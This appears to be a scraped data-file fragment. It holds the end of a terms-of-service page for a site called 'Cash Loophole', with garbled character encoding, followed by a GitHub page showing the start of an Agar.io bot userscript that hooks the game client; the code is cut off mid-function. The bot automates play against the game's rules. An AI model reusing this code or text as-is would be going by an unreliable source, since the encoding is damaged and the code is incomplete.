download information from the Site into your laptop, workstation or computer‚Äôs temporary memory (RAM) and print and download materials and information from the Site solely for your personal non-commercial use, provided that all hard copies contain all copyright and other applicable notices. LICENSE RESTRICTIONS. The foregoing license is limited. YOU MAY NOT MODIFY, COPY, STORE, REPRODUCE, REPUBLISH, UPLOAD, POST, TRANSMIT, LICENSE, SUBLICENSE, DISPLAY, RENT, LEASE, SELL, COMMERCIALLY EXPLOIT, OR DISTRIBUTE, IN ANY MANNER, ANY DATA, INTELLECTUAL PROPERTY OR MATERIAL PROVIDED BY Cash Loophole THROUGH THE SITE, IN ANY MANNER NOT EXPRESSLY PERMITTED BY THESE TERMS OF SERVICE. THE ABOVE RESTRICTION INCLUDES, BUT IS NOT LIMITED TO TEXT, GRAPHICS, CODE AND/OR SOFTWARE. In addition, you may not modify, translate, decompile, create any derivative work(s) of, disassemble, broadcast, publish, remove or alter any proprietary notices or labels, grant a security interest in, or otherwise use the Site in any manner not expressly permitted herein. Moreover, you may not (i) use any ‚Äúdeep link,‚Äù ‚Äúpage scrape,‚Äù ‚Äúrobot,‚Äù ‚Äúspider‚Äù or other automatic device, program, script, algorithm, or methodology, or any similar or equivalent manual process, to access, acquire, copy, or monitor any portion of the Site or in any way reproduce or circumvent the navigational structure or presentation of the Site to obtain or attempt to obtain any materials, documents, or information through any means not purposely made available through the Site, OR (ii) attempt to gain unauthorized access to any portion or feature of the Site, including, without limitation, the account of any other Authorized User(s), any other systems or networks connected to the Site or its servers, to any of the services offered on or through the Site, by hacking, password ‚Äúmining‚Äù, or any other illegitimate or prohibited means, OR (iii) probe, scan or test the vulnerability of the Site or any network connected to the Site, nor breach the security or authentication measures on the Site or any network connected to the Site, OR (iv) reverse look-up, trace, or seek to trace any information on any other Authorized User of or visitor to the Cash Loophole Site, OR (v) take any action that imposes an unreasonable or disproportionately large load on the infrastructure of the Site, the system, networks, or any systems or networks connected thereto, OR (vi) use any device, software, or routine to interfere with the proper working of the Site or transaction conducted on the Site, or with any other person‚Äôs use of the Site, OR (vii) forge headers, impersonate a person, or otherwise manipulate identifiers in order to disguise your identity or the origin of any message or transmittal you send to Cash Loophole on or through the Site, OR (viii) use the Site to collect e-mail addresses or other contact or personal information, OR (ix) market, co-brand, private label, appropriate, use the Cash Loophole name, or a name similar thereto on a different domain, separately distribute, resell, or otherwise permit third parties to access and use the Site, in whole or in part, without the express, separate and prior written permission of Cash Loophole, OR (x) use the Site in any other unlawful manner or in a manner that could be perceived to damage, disparage, or otherwise negatively impact Cash Loophole. 4.Moreover, this license is only valid where Cash Loophole is permitted to operate. Access to and use of this site in contravention of any laws or regulations, or where prohibited by law, is unauthorized and not permitted by Cash Loophole. THIRD PARTY INFORMATION/ PRODUCTS/ SERVICES/ LINKS TO OTHER SITES. The Site may contain information, data, links, promotional offers, or other content in any form, including financial information related to third parties. Such information is provided only for Your convenience and as a bonus service, and will not be considered financial advisement. In no case whatsoever shall Cash Loophole be liable for such content or any damages or losses that result from reliance thereon. You understand that, except for information, products or services clearly identified as being supplied by Cash Loophole, Cash Loophole is not affiliated with, is not responsible for, and does not operate, control or endorse any information, products or services offered by third parties that are provided on the Site in any way. Cash Loophole makes no representations whatsoever, nor does it guarantee or endorse, the quality, non-infringement, accuracy, completeness or reliability of such third-party materials, programs, products displayed on this Site or which You may access through a link on this Site. Your correspondence or any other dealings with such third parties found on this Site are solely between you and such third party. Accordingly, Cash Loophole EXPRESSLY DISCLAIMS RESPONSIBILITY FOR THE CONTENT, MATERIALS, ACCURACY, AND/OR QUALITY OF THE INFORMATION, PRODUCTS AND/OR SERVICES AVAILABLE THROUGH OR ADVERTISED ON THESE THIRD-PARTY WEBSITES. DISCLAIMER ‚Äì NO WARRANTIES. You understand and accept that Cash Loophole cannot and does not guarantee or warrant that files available for downloading through the Site will be free of infection or viruses, worms, Trojan horses or other code that manifest contaminating or destructive properties. You are responsible for implementing sufficient procedures and checkpoints on your personal computer to satisfy your particular requirements for accuracy of data input and output, and for maintaining a means external to the Site for the reconstruction of any lost data.YOU UNDERSTAND AND AGREE TO ASSUME TOTAL RESPONSIBILITY AND RISK FOR YOUR USE OF THE SITE. Cash Loophole PROVIDES THE SITE AND RELATED INFORMATION ‚ÄúAS IS‚Äù AND DOES NOT MAKE ANY EXPRESS OR IMPLIED WARRANTIES, REPRESENTATIONS OR ENDORSEMENTS WHATSOEVER. Cash Loophole SPECIFICALLY DISCLAIMS ANY IMPLIED WARRANTIES OF TITLE, MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. WITH REGARD TO THE SITE, THE PERSONAL ACCOUNT REPRESENTATIVE SERVICE, OR ANY INFORMATION OR THIRD-PARTY INFORMATION OR LINKS PROVIDED THEREON, Cash Loophole SHALL NOT BE LIABLE FOR ANY COST OR DAMAGE ARISING EITHER DIRECTLY OR INDIRECTLY FROM ANY SUCH TRANSACTION. IT IS SOLELY YOUR RESPONSIBILITY TO EVALUATE THE ACCURACY, COMPLETENESS AND USEFULNESS OF ALL OPINIONS, ADVICE, SERVICES, MERCHANDISE AND OTHER INFORMATION PROVIDED THROUGH THE SERVICE. Cash Loophole DOES NOT WARRANT THAT THE SERVICE WILL BE UNINTERRUPTED OR ERROR-FREE OR THAT DEFECTS IN THE SERVICE WILL BE CORRECTED. YOU UNDERSTAND FURTHER THAT THE PURE NATURE OF THE INTERNET CONTAINS UNEDITED MATERIALS SOME OF WHICH ARE SEXUALLY EXPLICIT OR MAY BE OFFENSIVE TO YOU. YOUR ACCESS TO SUCH MATERIALS IS AT YOUR OWN RISK. Cash Loophole HAS NO CONTROL OVER AND ACCEPTS NO RESPONSIBILITY WHATSOEVER FOR SUCH MATERIALS. LIMITATION OF LIABILITY. YOU EXPRESSLY ABSOLVE AND RELEASE Cash Loophole FROM ANY CLAIM OF HARM RESULTING FOR A CAUSE BEYOND Cash Loophole CONTROL, INCLUDING BUT NOT LIMITED TO FAILURE OF ELECTRONIC OR MECHANICAL EQUIPMENT OR COMMUNICATION LINES FOR ANY REASON, SUCH AS MAINTENANCE, DENIAL OF SERVICE ATTACKS, TELEPHONE OR OTHER COMMUNICATION PROBLEMS, COMPUTER VIRUSES, UNAUTHORIZED ACCESS, THEFT, OPERATOR ERRORS, FORCE MAJEURE EVENT SUCH AS SEVERE WEATHER, EARTHQUAKES, NATURAL DISASTERS, STRIKES, LABOR PROBLEMS, WARS, OR GOVERNMENTAL RESTRICTION OR ACTION. MOREOVER, IN NO EVENT WILL Cash Loophole BE LIABLE FOR ANY INCIDENTAL, CONSEQUENTIAL, INDIRECT, PUNITIVE, OR SPECIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, DAMAGES FOR LOSS OF PROFITS, BUSINESS INTERRUPTION, LOSS OF PROGRAMS OR INFORMATION, AND THE LIKE) ARISING OUT OF OR IN ANY WAY CONNECTED WITH THE USE OF OR INABILITY TO USE THE SITE‚ÄôS SERVICE, OR ANY INFORMATION, OR TRANSACTIONS PROVIDED OR DOWNLOADED FROM THE SITE, OR ANY DELAY OF SUCH INFORMATION OR SERVICE, EVEN IF Cash Loophole HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES, OR ANY CLAIM ATTRIBUTABLE TO ERRORS, OMISSIONS, OR OTHER INACCURACIES IN THE SITE AND/OR MATERIALS OR INFORMATION DOWNLOADED THROUGH THE SITE. BECAUSE SOME JURISDICTIONS DO NOT ALLOW THE EXCLUSION OR LIMITATION OF LIABILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES, THE ABOVE LIMITATION MAY NOT APPLY TO YOU. NOTWITHSTANDING THE FOREGOING, TOTAL LIABILITY OF Cash Loophole FOR ANY REASON RELATED TO USE OF THE SITE SHALL NOT EXCEED THE TOTAL AMOUNT PAID BY YOU TO Cash Loophole IN CONNECTION WITH THE SUBJECT MATTER OF THE PARTICULAR DISPUTE DURING THE PRIOR THREE MONTHS. INDEMNIFICATION.You agree to indemnify, defend and hold harmless Cash Loophole, its affiliates, and all of their respective officers, directors, employees, agents, licensors, attorneys, successors, and assigns from and against all claims, proceedings, injuries, liabilities, losses, damages, costs, and expenses, including reasonable attorneys‚Äô fees and litigation expenses, relating to or arising from any breach or violation of this Agreement by You (including negligent or reckless conduct). Each of the above referenced individuals or entities reserves the right to assert and enforce these provisions directly against you, on their own behalf. USER OBLIGATIONS. If you provide any false, inaccurate, untrue, or incomplete information, Cash Loophole reserves the right to terminate immediately Your access to and use of the Site and any downloadable software. You agree to abide by all applicable local, state, national, and international laws and regulations with respect to Your use of the Site and its related services. In addition, You acknowledge and agree that use of the Internet and access to or transmissions or communications with the Site is solely at your own risk. While Cash Loophole has endeavored to create a secure and reliable Site, you should understand that the confidentiality of any such communications cannot be guaranteed. Accordingly, Cash Loophole is not responsible for the security, or any breach thereof, of any information transmitted to or from the Site. You agree to assume all responsibility concerning activities related to Your use of the Site, including but not limited to obtaining and paying for all licenses and costs for third-party software and hardware necessary for implementation of the Site and its downloadable software, and maintaining or backing up any data. 10. USER NAME AND PASSWORD POLICY. Registration as an authorized user for access to certain areas of the Site may require both a user name and password. Only one authorized user can use one user name and password and account. Multiple accounts registered by the same individual or entity is not permitted and may result in one, some or all accounts being closed by Cash Loophole. By using the Site, you agree to keep your user name and password as confidential information. You also agree not to use another authorized user‚Äôs account. Should you become aware of any loss or theft of your password or any unauthorized use of your name and password, you will immediately notify Cash Loophole. Cash Loophole cannot and will not be liable for any loss or damage arising from your failure to comply with these obligations. Cash Loophole also reserves the right to delete or change (with notice) a user name or password at any time and for any reason. FEEDBACK AND SUBMISSIONS. You grant to Cash Loophole team the right to use your name in connection with any materials freely submitted by You and any other information as well as in connection with all advertising, marketing and promotional material related thereto. You agree that you shall have no recourse against Cash Loophole for any alleged or actual infringement or misappropriation of any proprietary right in your communications with the Site. Registered Site Users will have the opportunity to submit feedback and information regarding their trading activity through the software and through the website, which will be subsequently displayed on the website on an anonymous basis. Such information is submitted on a voluntary basis. Cash Loophole maintains no control over the accuracy or correctness of such self-reporting and accordingly disclaims all liability from User reliance on this data. PRIVACY POLICY. You understand, acknowledge and agree that the operation of certain programs, services, tools, materials, or information of the Site requires the submission, use and dissemination of various personal identifying information. Accordingly, if you wish to access and use those programs, services, tools, materials, or information on the Site, you acknowledge and agree that your use of the Site will constitute acceptance of Cash Loophole personal identifying information collection and use practices to protect your personal information. Please read our Privacy Policy before providing any personal data on this Site. VOID WHERE PROHIBITED. Any offer for any product or service made on this Site is void where prohibited. Moreover, Cash Loophole makes no representations regarding the legality of access to or use of the Site or its content in any country. Although the Site may be accessible worldwide, not all features, products or services provided or offered through or on the Site are appropriate or available for use in all countries. Cash Loophole reserves the right to limit, in its discretion, the provision and quantity of any feature, product or service to any person or geographic area. If You access the Site from a jurisdiction where prohibited, You do so at your own risk and You are solely responsible for complying with all applicable local regulations. People under 18 years of age are not permitted to use the Cash Loophole website. 15. NO ADVICE. You acknowledge that neither the Site or the Personal Account Representative service, is not authorized to offer any legal, tax, accounting advice, or recommendation regarding suitability, profitability, investment strategy or other matter. 17. ENFORCING SITE SECURITY. Actual or attempted unauthorized use of this Site may result in criminal and/or civil prosecution. Cash Loophole reserves the right to view, monitor, and record activity on the Site without notice or permission from the User, including, without limitation, by archiving notices or communications sent by you through the Site. In addition, Cash Loophole reserves the right, at any time and without notice, to modify, suspend, terminate or interrupt operation of or access to the Site, or any portion thereof, in order to protect the Site or Cash Loophole business. NOTICE OF SECURITY BREACH. In addition to the indemnification obligation stated in these Terms of Service, if you become aware of a breach or potential breach of security with respect to any personally identifiable information provided to or made available by Cash Loophole, or any unauthorized hacking of the Site, you shall (i) immediately notify Cash Loophole of such breach or potential breach, (ii) assist Cash Loophole as reasonably necessary to prevent or rectify any such breach, and (iii) enable Cash Loophole to comply with any applicable laws requiring the provision of notice of a security breach with respect to any impacted personally identifiable information. TERM AND TERMINATION. These Terms of Service govern Your right to use the Site will take effect at the moment you access or use the Site and is effective until terminated, as set forth below. This Agreement may be terminated by Cash Loophole without notice, at any time, and for any reason. In addition, Cash Loophole reserves the right at any time and on reasonable grounds, such as any reasonable belief of fraudulent or unlawful activity or actions or omissions that violate any term or condition of these Terms, to deny your access to the Site, in whole or in part, in order to protect its name and goodwill, its business and/or other authorized users, or if you fail to comply with these Terms, subject to the survival rights of certain provisions identified below. Termination is effective without notice. You may also terminate this Agreement at any time by ceasing to use the Site, subject to the survival rights below. Upon termination, You must destroy all copies of any aspect of the Site that you have made and remove downloaded software from Your possession. The following provisions shall survive termination of the Website Terms of Service Agreement for any reason: Proprietary Rights (¬ß1), Limited License Grant (¬ß2), License Restrictions (¬ß3), Third Party Information (¬ß4), Disclaimer (¬ß5), Limitation of Liability (¬ß6), Indemnification (¬ß7), Governing Law (¬ß17), and Miscellaneous (¬ß18). GOVERNING LAW AND DISPUTE RESOLUTION. These Terms of Service and all disputes or claims arising out of or related thereto shall be governed by the laws of Cyprus, without applying conflict of law rules. Any cause of action or claim arising out of use of the Site must be commenced within one (1) year after the claim or cause of action arises, or such claim or cause of action is barred. Claimant and Cash Loophole waive their rights to a jury trial and participation in class action litigation. All disputes arising out of or relating to these Terms of Service shall be resolved by binding arbitration, except that Cash Loophole is not required to arbitrate any dispute regarding confidentiality, infringement, misappropriation, or misuse of any intellectual property right, or any other claim where interim relief from a court is sought to prevent serious and irreparable injury to Cash Loophole or any other person or entity. You acknowledge that any breach, threatened or actual, could cause irreparable injury to Cash Loophole that is not quantifiable in monetary damages. You agree that Cash Loophole shall be entitled to seek and be awarded an injunction or other appropriate equitable relief to restrain any breach of Your obligations under these Terms. Accordingly, you waive any requirement that Cash Loophole post any bond or other security in the event that any injunctive or equitable relief is sought by or awarded to Cash Loophole to enforce any provision of these Terms. MISCELLANEOUS. You agree that these Terms are for the benefit of the User, Cash Loophole, and Cash Loophole licensors. Therefore, these Terms are personal to You and not assignable. No joint venture, partnership, employment, or agency relationship exists between You and Cash Loophole as a result of these Terms of Service or arising out of your use of the Site. Cash Loophole failure to insist upon or enforce strict performance of any provision of this Agreement shall not be construed as a waiver of any provision or right under these Terms or at law. Neither the course of conduct between the parties nor trade practice shall act to modify any provision of this Agreement. Cash Loophole may assign its rights and duties under this Agreement to any party and at any time, without notice to the User. Headings herein are for convenience only. These Terms of Service, along with Cash Loophole Website Privacy Policy and the Software License Agreement, represent the entire agreement between You and Cash Loophole with respect to use of the Site, and supersedes all prior or contemporaneous communications and proposals, whether electronic, oral, or written between You and Cash Loophole. SEVERABILITY. If any provision of these Terms of Service is ruled invalid or otherwise unenforceable by a court of competent jurisdiction or on account of a conflict with an applicable government regulation, such determination shall not affect the remaining provisions (or parts thereof) contained herein. Any invalid or unenforceable portion should be deemed amended in order to achieve as closely as possible the same effect as the Terms of Service as original drafted. Cash Loophole ¬© 2016 All rights reserved.",,3
0,https://github.com/DickDumBR1/Aim.git,"Skip to content Sign up Sign in This repository   Search Explore Features Enterprise Pricing  Watch 137  Star 490  Fork 1,535 Apostolique/Agar.io-bot Branch: master  Agar.io-bot/launcher.user.js @ApostoliqueApostolique 10 days ago Easier to see the borders 7 contributors @Apostolique @DarkN3ss61 @Linkaan @Timtech @henopied @Gjum @lilezek RawBlameHistory     2456 lines (2277 sloc)  93.893 kB /*The MIT License (MIT) Copyright (c) 2015 Apostolique Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/  // ==UserScript== // @name        AposLauncher // @namespace   AposLauncher // @include     http://agar.io/* // @version     4.123 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript==  var aposLauncherVersion = 4.123;  Number.prototype.mod = function(n) {     return ((this % n) + n) % n; };  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b""; function getLatestCommit() {     window.jQuery.ajax({             url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",             cache: false,             dataType: ""jsonp""         }).done(function(data) {             console.dir(data.data);             console.log(""hmm: "" + data.data.object.sha);             sha = data.data.object.sha;              function update(prefix, name, url) {                 window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");                 window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");                 window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                     window.jQuery(""#"" + prefix + ""Dialog"").hide();                     window.jQuery(""#"" + prefix + ""Dialog"").remove();                 });                 window.jQuery(""#"" + prefix + ""Dialog"").show();             }              window.jQuery.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/launcher.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {                 var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm, """");                 latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"") + 11, latestVersion.indexOf(""// @grant""));                  latestVersion = parseFloat(latestVersion + 0.0000);                 var myVersion = parseFloat(aposLauncherVersion + 0.0000);                  if (latestVersion > myVersion) {                     update(""aposLauncher"", ""launcher.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/launcher.user.js/"");                 }                 console.log(\'Current launcher.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);             });          }).fail(function() {}); } getLatestCommit();  console.log(""Running Bot Launcher!""); (function(d, e) {      //UPDATE     function keyAction(e) {         if (84 == e.keyCode) {             console.log(""Toggle"");             toggle = !toggle;         }         if (82 == e.keyCode) {             console.log(""ToggleDraw"");             toggleDraw = !toggleDraw;         }         if (68 == e.keyCode) {             window.setDarkTheme(!getDarkBool());         }         if (70 == e.keyCode) {             window.setShowMass(!getMassBool());         }         if (69 == e.keyCode) {             if (message.length > 0) {                 window.setMessage([]);                 window.onmouseup = function() {};                 window.ignoreStream = true;             } else {                 window.ignoreStream = false;                 window.refreshTwitch();             }         }         window.botList[botIndex].keyAction(e);     }      function humanPlayer() {         //Don\'t need to do anything.         return [getPointX(), getPointY()];     }        function pb() {          //UPDATE          window.botList = window.botList || [];          window.jQuery(\'#nick\').val(originalName);          function HumanPlayerObject() {             this.name = ""Human"";             this.keyAction = function(key) {};             this.displayText = function() {return [];};             this.mainLoop = humanPlayer;         }          var hpo = new HumanPlayerObject();          window.botList.push(hpo);          window.updateBotList();          ya = !0;         Pa();         setInterval(Pa, 18E4);          var father = window.jQuery(""#canvas"").parent();         window.jQuery(""#canvas"").remove();         father.prepend(""<canvas id=\'canvas\'>"");          G = za = document.getElementById(""canvas"");         f = G.getContext(""2d"");         G.onmousedown = function(a) {             if (Qa) {                 var b = a.clientX - (5 + m / 5 / 2),                     c = a.clientY - (5 + m / 5 / 2);                 if (Math.sqrt(b * b + c * c) <= m / 5 / 2) {                     V();                     H(17);                     return                 }             }             fa = a.clientX;             ga = a.clientY;             Aa();             V();         };         G.onmousemove = function(a) {             fa = a.clientX;             ga = a.clientY;             Aa();         };         G.onmouseup = function() {};         /firefox/i.test(navigator.userAgent) ? document.addEventListener(""DOMMouseScroll"", Ra, !1) : document.body.onmousewheel = Ra;         var a = !1,             b = !1,             c = !1;         d.onkeydown = function(l) {             //UPDATE             if (!window.jQuery(\'#nick\').is("":focus"")) {                 32 != l.keyCode || a || (V(), H(17), a = !0);                 81 != l.keyCode || b || (H(18), b = !0);                 87 != l.keyCode || c || (V(), H(21), c = !0);                 27 == l.keyCode && Sa(!0);                  //UPDATE                 keyAction(l);             }         };         d.onkeyup = function(l) {             32 == l.keyCode && (a = !1);             87 == l.keyCode && (c = !1);             81 == l.keyCode && b && (H(19), b = !1);         };         d.onblur = function() {             H(19);             c = b = a = !1         };         d.onresize = Ta;         d.requestAnimationFrame(Ua);         setInterval(V, 40);         y && e(""#region"").val(y);         Va();         ha(e(""#region"").val());         0 == Ba && y && I();         W = !0;         e(""#overlays"").show();         Ta();         d.location.hash && 6 <= d.location.hash.length && Wa(d.location.hash)     }      function Ra(a) {         J *= Math.pow(.9, a.wheelDelta / -120 || a.detail || 0);         //UPDATE         0.07 > J && (J = 0.07);         J > 4 / h && (J = 4 / h)     }      function qb() {         if (.4 > h) X = null;         else {             for (var a = Number.POSITIVE_INFINITY, b = Number.POSITIVE_INFINITY, c = Number.NEGATIVE_INFINITY, l = Number.NEGATIVE_INFINITY, d = 0, p = 0; p < v.length; p++) {                 var g = v[p];                 !g.N() || g.R || 20 >= g.size * h || (d = Math.max(g.size, d), a = Math.min(g.x, a), b = Math.min(g.y, b), c = Math.max(g.x, c), l = Math.max(g.y, l))             }             X = rb.ka({                 ca: a - 10,                 da: b - 10,                 oa: c + 10,                 pa: l + 10,                 ma: 2,                 na: 4             });             for (p = 0; p < v.length; p++)                 if (g = v[p],                     g.N() && !(20 >= g.size * h))                     for (a = 0; a < g.a.length; ++a) b = g.a[a].x, c = g.a[a].y, b < s - m / 2 / h || c < t - r / 2 / h || b > s + m / 2 / h || c > t + r / 2 / h || X.m(g.a[a])         }     }      function Aa() {         //UPDATE         if (toggle || window.botList[botIndex].name == ""Human"") {             setPoint(((fa - m / 2) / h + s), ((ga - r / 2) / h + t));         }     }      function Pa() {         null == ka && (ka = {}, e(""#region"").children().each(function() {             var a = e(this),                 b = a.val();             b && (ka[b] = a.text())         }));         e.get(""https://m.agar.io/info"", function(a) {                 var b = {},                     c;                 for (c in a.regions) {                     var l = c.split("":"")[0];                     b[l] = b[l] || 0;                     b[l] += a.regions[c].numPlayers                 }                 for (c in b) e(\'#region option[value=""\' + c + \'""]\').text(ka[c] + "" ("" + b[c] + "" players)"")             },             ""json"")     }      function Xa() {         e(""#adsBottom"").hide();         e(""#overlays"").hide();         W = !1;         Va();         d.googletag && d.googletag.pubads && d.googletag.pubads().clear(d.aa)     }      function ha(a) {         a && a != y && (e(""#region"").val() != a && e(""#region"").val(a), y = d.localStorage.location = a, e("".region-message"").hide(), e("".region-message."" + a).show(), e("".btn-needs-server"").prop(""disabled"", !1), ya && I())     }      function Sa(a) {         W || (K = null, sb(), a && (x = 1), W = !0, e(""#overlays"").fadeIn(a ? 200 : 3E3))     }      function Y(a) {         e(""#helloContainer"").attr(""data-gamemode"", a);         P = a;         e(""#gamemode"").val(a)     }      function Va() {         e(""#region"").val() ? d.localStorage.location = e(""#region"").val() : d.localStorage.location && e(""#region"").val(d.localStorage.location);         e(""#region"").val() ? e(""#locationKnown"").append(e(""#region"")) : e(""#locationUnknown"").append(e(""#region""))     }      function sb() {         la && (la = !1, setTimeout(function() {             la = !0         //UPDATE         }, 6E4 * Ya))     }      function Z(a) {         return d.i18n[a] || d.i18n_dict.en[a] || a     }      function Za() {         var a = ++Ba;         console.log(""Find "" + y + P);         e.ajax(""https://m.agar.io/findServer"", {             error: function() {                 setTimeout(Za, 1E3)             },             success: function(b) {                 a == Ba && (b.alert && alert(b.alert), Ca(""ws://"" + b.ip, b.token))             },             dataType: ""json"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: (y + P || ""?"") + ""\\n154669603""         })     }      function I() {         ya && y && (e(""#connecting"").show(), Za())     }      function Ca(a, b) {         if (q) {             q.onopen = null;             q.onmessage = null;             q.onclose = null;             try {                 q.close()             } catch (c) {}             q = null         }         Da.la && (a = ""ws://"" + Da.la);         if (null != L) {             var l = L;             L = function() {                 l(b)             }         }         if (tb) {             var d = a.split("":"");             a = d[0] + ""s://ip-"" + d[1].replace(/\\./g, ""-"").replace(/\\//g, """") + "".tech.agar.io:"" + (+d[2] + 2E3)         }         M = [];         k = [];         E = {};         v = [];         Q = [];         F = [];         z = A = null;         R = 0;         $ = !1;         console.log(""Connecting to "" + a);         //UPDATE         serverIP = a;         q = new WebSocket(a);         q.binaryType = ""arraybuffer"";         q.onopen = function() {             var a;             console.log(""socket open"");             a = N(5);             a.setUint8(0, 254);             a.setUint32(1, 5, !0);             O(a);             a = N(5);             a.setUint8(0, 255);             a.setUint32(1, 154669603, !0);             O(a);             a = N(1 + b.length);             a.setUint8(0, 80);             for (var c = 0; c < b.length; ++c) a.setUint8(c + 1, b.charCodeAt(c));             O(a);             $a()         };         q.onmessage = ub;         q.onclose = vb;         q.onerror = function() {             console.log(""socket error"")         }     }      function N(a) {         return new DataView(new ArrayBuffer(a))     }      function O(a) {         q.send(a.buffer)     }      function vb() {         $ && (ma = 500);         console.log(""socket close"");         setTimeout(I, ma);         ma *= 2     }      function ub(a) {         wb(new DataView(a.data))     }      function wb(a) {         function b() {             for (var b = """";;) {                 var d = a.getUint16(c, !0);                 c += 2;                 if (0 == d) break;                 b += String.fromCharCode(d)             }             return b         }         var c = 0;         240 == a.getUint8(c) && (c += 5);         switch (a.getUint8(c++)) {             case 16:                 xb(a, c);                 break;             case 17:                 aa = a.getFloat32(c, !0);                 c += 4;                 ba = a.getFloat32(c, !0);                 c += 4;                 ca = a.getFloat32(c, !0);                 c += 4;                 break;             case 20:                 k = [];                 M = [];                 break;             case 21:                 Ea = a.getInt16(c, !0);                 c += 2;                 Fa = a.getInt16(c, !0);                 c += 2;                 Ga || (Ga = !0, na = Ea, oa = Fa);                 break;             case 32:                 M.push(a.getUint32(c, !0));                 c += 4;                 break;             case 49:                 if (null != A) break;                 var l = a.getUint32(c, !0),                     c = c + 4;                 F = [];                 for (var d = 0; d < l; ++d) {                     var p = a.getUint32(c, !0),                         c = c + 4;                     F.push({                         id: p,                         name: b()                     })                 }                 ab();                 break;             case 50:                 A = [];                 l = a.getUint32(c, !0);                 c += 4;                 for (d = 0; d < l; ++d) A.push(a.getFloat32(c, !0)), c += 4;                 ab();                 break;             case 64:                 pa = a.getFloat64(c, !0);                 c += 8;                 qa = a.getFloat64(c, !0);                 c += 8;                 ra = a.getFloat64(c, !0);                 c += 8;                 sa = a.getFloat64(c, !0);                 c += 8;                 aa = (ra + pa) / 2;                 ba = (sa + qa) / 2;                 ca = 1;                 0 == k.length && (s = aa, t = ba, h = ca);                 break;             case 81:                 var g = a.getUint32(c, !0),                     c = c + 4,                     e = a.getUint32(c, !0),                     c = c + 4,                     f = a.getUint32(c, !0),                     c = c + 4;                 setTimeout(function() {                     S({                         e: g,                         f: e,                         d: f                     })                 }, 1200)         }     }      function xb(a, b) {         bb = C = Date.now();         $ || ($ = !0, e(""#connecting"").hide(), cb(), L && (L(), L = null));         var c = Math.random();         Ha = !1;         var d = a.getUint16(b, !0);         b += 2;         for (var u = 0; u < d; ++u) {             var p = E[a.getUint32(b, !0)],                 g = E[a.getUint32(b + 4, !0)];             b += 8;             p && g && (g.X(), g.s = g.x, g.t = g.y, g.r = g.size, g.J = p.x, g.K = p.y, g.q = g.size, g.Q =                 C)         }         for (u = 0;;) {             d = a.getUint32(b, !0);             b += 4;             if (0 == d) break;             ++u;             var f, p = a.getInt16(b, !0);             b += 4;             g = a.getInt16(b, !0);             b += 4;             f = a.getInt16(b, !0);             b += 2;             for (var h = a.getUint8(b++), w = a.getUint8(b++), m = a.getUint8(b++), h = (h << 16 | w << 8 | m).toString(16); 6 > h.length;) h = ""0"" + h;             var h = ""#"" + h,                 w = a.getUint8(b++),                 m = !!(w & 1),                 r = !!(w & 16);             w & 2 && (b += 4);             w & 4 && (b += 8);             w & 8 && (b += 16);             for (var q, n = """";;) {                 q = a.getUint16(b, !0);                 b += 2;                 if (0 == q) break;                 n += String.fromCharCode(q)             }             q = n;             n = null;             E.hasOwnProperty(d) ? (n = E[d], n.P(), n.s = n.x, n.t = n.y, n.r = n.size, n.color = h) :                 (n = new da(d, p, g, f, h, q), v.push(n), E[d] = n, n.ua = p, n.va = g);             n.h = m;             n.n = r;             n.J = p;             n.K = g;             n.q = f;             n.sa = c;             n.Q = C;             n.ba = w;             q && n.B(q); - 1 != M.indexOf(d) && -1 == k.indexOf(n) && (document.getElementById(""overlays"").style.display = ""none"", k.push(n), n.birth = getLastUpdate(), n.birthMass = (n.size * n.size / 100), 1 == k.length && (s = n.x, t = n.y, db()))              //UPDATE             interNodes[d] = window.getCells()[d];         }          //UPDATE         Object.keys(interNodes).forEach(function(element, index) {             //console.log(""start: "" + interNodes[element].updateTime + "" current: "" + D + "" life: "" + (D - interNodes[element].updateTime));             var isRemoved = !window.getCells().hasOwnProperty(element);              //console.log(""Time not updated: "" + (window.getLastUpdate() - interNodes[element].getUptimeTime()));             if (isRemoved && (window.getLastUpdate() - interNodes[element].getUptimeTime()) > 3000) {                 delete interNodes[element];             } else {                 for (var i = 0; i < getPlayer().length; i++) {                     if (isRemoved && 